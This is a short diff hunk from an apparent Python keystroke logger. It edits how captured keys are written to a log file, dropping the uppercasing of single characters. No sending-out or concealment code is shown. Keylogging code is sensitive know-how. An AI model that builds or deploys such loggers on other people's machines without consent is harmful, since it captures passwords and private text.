@@ -23,7 +23,7 @@ def write_to_file(key):
             key_data = '[ESC]'
         else:
             # Handle other special keys (e.g., shift, ctrl, etc.)
-            key_data = key_data if len(key_data) > 1 else key_data.upper()
+            key_data = key_data if len(key_data) > 1 else key_data
 
         # Write the key data to the file
         with open(log_file, "a") as f:
